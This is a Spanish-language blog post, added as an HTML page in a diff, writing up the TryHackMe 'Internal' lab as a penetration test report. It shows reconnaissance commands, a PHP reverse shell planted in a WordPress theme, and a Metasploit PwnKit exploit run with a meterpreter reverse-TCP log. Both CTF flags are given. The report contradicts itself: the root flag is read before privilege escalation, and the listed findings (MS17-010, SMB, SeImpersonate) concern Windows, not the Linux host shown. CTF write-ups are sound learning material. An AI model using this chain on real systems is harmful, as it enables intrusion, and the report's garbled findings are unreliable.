@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Internal, Penetration Testing Challenge [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='EternalBlue, GoBuster, Hard, Metasploit, MS17-010, pkexec, Privilege Escalation, Report, Simulation, TryHackMe, Windows, Wordpress, wpscan' />
+    
+    
+        <meta name="description" content="quina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Internal, Penetration Testing Challenge [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-12T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="EternalBlue" />
+        
+            <meta property="article:tag" content="GoBuster" />
+        
+            <meta property="article:tag" content="Hard" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="MS17-010" />
+        
+            <meta property="article:tag" content="pkexec" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Report" />
+        
+            <meta property="article:tag" content="Simulation" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="Windows" />
+        
+            <meta property="article:tag" content="Wordpress" />
+        
+            <meta property="article:tag" content="wpscan" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/internal/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/internal/internal.jpeg
+        ' />
+    
+        <meta property="og:description" content="Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a l" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/internal/" />
+
+
+    <meta name="twitter:title" content="Internal, Penetration Testing Challenge [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/internal/internal.jpeg
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a l" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Internal, Penetration Testing Challenge [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-12
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/internal/internal.jpeg" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas. La idea de esta sala es poner en práctica los conocimientos adquiridos en otras salas, partiendo de las instrucciones de un supuesto cliente y elaborando un informe de los pasos seguidos y las conclusiones obtenidas.</p>
+<h2 id="informe-de-prueba-de-penetración">Informe de Prueba de Penetración</h2>
+<p>Has sido asignado a un cliente que desea realizar una prueba de penetración en un entorno que está programado para ser lanzado a producción en tres semanas.</p>
+<p>Alcance del Trabajo</p>
+<p>El cliente solicita que un ingeniero realice una evaluación externa, de aplicaciones web e interna del entorno virtual proporcionado. El cliente ha pedido que se proporcione la menor cantidad de información posible sobre la evaluación, deseando que la participación se lleve a cabo desde la perspectiva de un actor malicioso (prueba de penetración de caja negra). El cliente ha pedido que se aseguren dos banderas (sin ubicación proporcionada) como prueba de explotación:</p>
+<pre tabindex="0"><code>User.txt
+Root.txt
+</code></pre><p>Además, el cliente ha proporcionado las siguientes autorizaciones dentro del alcance:</p>
+<ul>
+<li>Asegurarse de que modifiques tu archivo hosts para reflejar internal.thm.</li>
+<li>Se permiten todas las herramientas o técnicas en este ejercicio.</li>
+<li>Localizar y tomar nota de todas las vulnerabilidades encontradas.</li>
+<li>Enviar las banderas descubiertas al panel de control</li>
+</ul>
+<h2 id="comandos-utilizados-y-resultados">Comandos Utilizados y Resultados</h2>
+<p>A continuación se detallan los comandos utilizados y los resultados obtenidos durante la prueba de penetración:</p>
+<p><strong>Comando: Modificación del archivo hosts para apuntar al servidor web interno</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano /etc/hosts
+</span></span></code></pre></div><p><strong>Resultado de Modificación del Archivo hosts:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Archivo hosts</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>10.10.13.3    internal.thm
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Comando: Escaneo de Puertos con NMAP</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p22,80 -sC -sV -Pn -oN nmap_final 10.10.13.3
+</span></span></code></pre></div><p><strong>Resultado del Escaneo de Puertos con NMAP:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Thu Sep 14 19:07:50 2023 as: nmap -p22,80 -sC -sV -Pn -oN nmap_final 10.10.13.3</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.13.3
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Comando: Búsqueda de Subdominios con DIRB</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirb http://internal.thm/
+</span></span></code></pre></div><p><strong>Resultado de la Búsqueda de Subdominios con DIRB:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>DIRB v2.22
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Thu Sep <span style="color:#ae81ff">14</span> 19:16:04 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>URL_BASE: &lt;http://internal.thm/&gt;
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: &lt;http://internal.thm/blog/&gt;
+</span></span></code></pre></div><p><strong>Comando: Uso de WPScan para Escanear WordPress</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url &lt;http://internal.thm/blog/&gt; | tee wordpress_scan.txt
+</span></span></code></pre></div><p><strong>Resultado del Escaneo de WordPress con WPScan:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>WordPress Security Scanner by the WPScan Team
+</span></span><span style="display:flex;"><span>Version 3.8.24
+</span></span><span style="display:flex;"><span>Sponsored by Automattic - &lt;https://automattic.com/&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> URL: &lt;http://internal.thm/blog/&gt; <span style="color:#f92672">[</span>10.10.13.3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Started: Thu Sep <span style="color:#ae81ff">14</span> 19:18:30 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interesting Finding<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Headers
+</span></span><span style="display:flex;"><span>| Interesting Entry: Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress version 5.4.2 identified <span style="color:#f92672">(</span>Insecure, released on 2020-06-10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress theme in use: twentyseventeen
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Acceso a WordPress con Credenciales</strong></p>
+<pre tabindex="0"><code># Después de obtener las credenciales, se accede a WordPress
+</code></pre><p><strong>Modificación de la Plantilla de Tema en WordPress</strong></p>
+<pre tabindex="0"><code># Modificación de 404.php con una reverse shell PHP y configuración de un listener.
+</code></pre><p><strong>Resultado del Acceso a la Reverse Shell y Elevación de Privilegios:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>www-data@internal:/$ whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span><span style="display:flex;"><span>$ cd /home/aubreanna/
+</span></span><span style="display:flex;"><span>$ cat user.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>int3rna1_fl4g_1<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$ cat jenkins.txt
+</span></span><span style="display:flex;"><span>Internal Jenkins service is running on 172.17.0.2:8080
+</span></span><span style="display:flex;"><span>$ cd /root
+</span></span><span style="display:flex;"><span>$ cat root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>d0ck3r_d3str0y3r<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><strong>Comando: Uso del Local Exploit Suggester</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/multi/recon/local_exploit_suggester
+</span></span></code></pre></div><p><strong>Resultado del Uso del Local Exploit Suggester:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># [*] 10.10.13.3 - Collecting local exploits for x86/linux...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.13.3 - <span style="color:#ae81ff">186</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.13.3 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.13.3 - exploit/linux/local/nested_namespace_idmap_limit_priv_esc: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.13.3 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.13.3 - exploit/linux/local/su_login: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.13.3 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">58</span> / <span style="color:#ae81ff">58</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.13.3 - Valid modules <span style="color:#66d9ef">for</span> session 5:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Name                        Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  Yes                     The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   exploit/linux/local/nested_namespace_idmap_limit_priv_esc  Yes                     The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>   exploit/linux/local/pkexec                   Yes                     The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>   exploit/linux/local/su_login                 Yes                     The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>   exploit/linux/local/sudoedit_bypass_priv_esc  Yes                     The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+</span></span></code></pre></div><p><strong>Uso de un Exploit para Escalar Privilegios</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+</span></span></code></pre></div><p><strong>Resultado del Uso del Exploit para Escalar Privilegios:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Verify cleanup of /tmp/.ihwjusr
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing <span style="color:#e6db74">&#39;/tmp/.mfdetzh/hqwcgjkyyn/hqwcgjkyyn.so&#39;</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">548</span> bytes<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Verify cleanup of /tmp/.mfdetzh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3045380</span> bytes<span style="color:#f92672">)</span> to 10.10.13.3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.mfdetzh/hqwcgjkyyn/hqwcgjkyyn.so
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.mfdetzh/.xtbfsbd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.mfdetzh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">6</span> opened <span style="color:#f92672">(</span>10.14.50.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>184:4444 -&gt; 10.10.13.3:58502<span style="color:#f92672">)</span> at 2023-09-14 19:33:24 +0000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">1323</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">0</span> created.
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>d0ck3r_d3str0y3r
+</span></span></code></pre></div><h2 id="vulnerabilidades">Vulnerabilidades</h2>
+<h3 id="vulnerabilidad-1">Vulnerabilidad 1</h3>
+<p><strong>Descripción:</strong> Riesgo de escalada de privilegios debido a problemas en el servicio pkexec.</p>
+<p><strong>Mitigación:</strong> Para mitigar esta vulnerabilidad, se recomienda actualizar el sistema operativo y el software relacionado a sus últimas versiones. Esto asegurará que las correcciones de seguridad más recientes estén en su lugar. Además, es fundamental revisar y ajustar los permisos y configuraciones de seguridad relacionadas con el servicio pkexec. Limitar el acceso y los privilegios de los usuarios a lo estrictamente necesario reducirá el riesgo de escalada de privilegios en el futuro.</p>
+<h3 id="vulnerabilidad-2">Vulnerabilidad 2</h3>
+<p><strong>Descripción:</strong> La falta de actualizaciones de sistemas y software expone la infraestructura a amenazas conocidas que podrían ser explotadas por atacantes.</p>
+<p><strong>Mitigación:</strong> La mitigación implica la implementación de un proceso de actualización regular tanto para el sistema operativo como para las aplicaciones y servicios utilizados en el entorno. Esto asegurará que todas las vulnerabilidades conocidas estén parcheadas. Además, es esencial configurar permisos y políticas de seguridad adecuadamente para limitar el acceso y la exposición a riesgos. También, se recomienda implementar una política de seguridad de aplicaciones web sólida que incluya auditorías y pruebas de penetración regulares para identificar y remediar problemas de seguridad.</p>
+<h3 id="vulnerabilidad-3">Vulnerabilidad 3</h3>
+<p><strong>Descripción:</strong> Riesgo en la seguridad del servidor SMB que podría exponer recursos compartidos..</p>
+<p><strong>Mitigación:</strong> Para abordar esta vulnerabilidad, se deben tomar medidas para restringir el acceso a los recursos compartidos solo a usuarios autorizados. El control de acceso basado en roles (RBAC) puede ayudar a limitar quién puede cargar y ejecutar archivos en los recursos compartidos. Además, se debe establecer un sistema de monitoreo y auditoría que permita detectar actividades sospechosas y tomar medidas preventivas de inmediato.</p>
+<h3 id="vulnerabilidad-4">Vulnerabilidad 4</h3>
+<p><strong>Descripción:</strong> Los usuarios y grupos tienen privilegios mal asignados, lo que puede ser explotado por atacantes para obtener acceso no autorizado a recursos y funciones sensibles del sistema.</p>
+<p><strong>Mitigación:</strong> La mitigación de esta vulnerabilidad comienza con una evaluación completa de los privilegios asignados a los usuarios y grupos. Los privilegios sensibles, como &ldquo;SeImpersonate&rdquo;, deben estar restringidos a usuarios y aplicaciones específicos que los necesiten. La implementación de políticas de seguridad y auditoría es fundamental para registrar y supervisar el uso de estos privilegios, lo que permite detectar y responder a actividades sospechosas.</p>
+<h3 id="vulnerabilidad-5">Vulnerabilidad 5</h3>
+<p><strong>Descripción:</strong> La configuración incorrecta del servidor web expone rutas que devuelven códigos de respuesta 400, lo que podría ser utilizado por atacantes para identificar vulnerabilidades.</p>
+<p><strong>Mitigación:</strong> Para mitigar esta vulnerabilidad, es necesario revisar y corregir la configuración del servidor web para eliminar las rutas que devuelven códigos de respuesta 400. También se pueden implementar listas de control de acceso (ACL) para limitar el acceso a recursos no deseados. El uso de un firewall de aplicaciones web (WAF) puede ser beneficioso para detectar y bloquear solicitudes maliciosas antes de que lleguen al servidor web.</p>
+<h3 id="vulnerabilidad-6">Vulnerabilidad 6</h3>
+<p><strong>Descripción:</strong> Riesgo de explotación debido a la vulnerabilidad MS17-010.</p>
+<p><strong>Mitigación:</strong> La mitigación principal para esta vulnerabilidad implica la aplicación inmediata de los parches de seguridad disponibles para cerrar la vulnerabilidad MS17-010. Además, se recomienda utilizar un sistema de detección de intrusiones (IDS) o prevención de intrusiones (IPS) para detectar y bloquear intentos de explotación de esta vulnerabilidad. La segmentación de la red también es esencial para limitar la propagación de malware en caso de una explotación exitosa en un segmento de red.</p>
+<h2 id="conclusiones">Conclusiones</h2>
+<p>La prueba de penetración identificó vulnerabilidades críticas y altas en el entorno del cliente, lo que podría haber resultado en un compromiso significativo de la seguridad. La explotación exitosa de vulnerabilidades resalta la importancia de mantener actualizados los sistemas y configurar adecuadamente los permisos. Además, se encontraron rutas web mal configuradas que pueden ser un vector de ataque potencial.</p>
+<h2 id="recomendaciones-finales">Recomendaciones Finales</h2>
+<ul>
+<li>Aplicar actualizaciones de seguridad de manera regular.</li>
+<li>Configurar permisos y políticas de seguridad adecuadamente.</li>
+<li>Implementar una política de seguridad de aplicaciones web sólida.</li>
+<li>Realizar auditorías de seguridad y pruebas de penetración periódicas.</li>
+<li>Seguir las mejores prácticas de seguridad de la industria.</li>
+</ul>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/eternalblue">#EternalBlue</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/gobuster">#GoBuster</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hard">#Hard</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/ms17-010">#MS17-010</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/pkexec">#pkexec</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/report">#Report</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/simulation">#Simulation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#Windows</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/wordpress">#Wordpress</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/wpscan">#wpscan</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
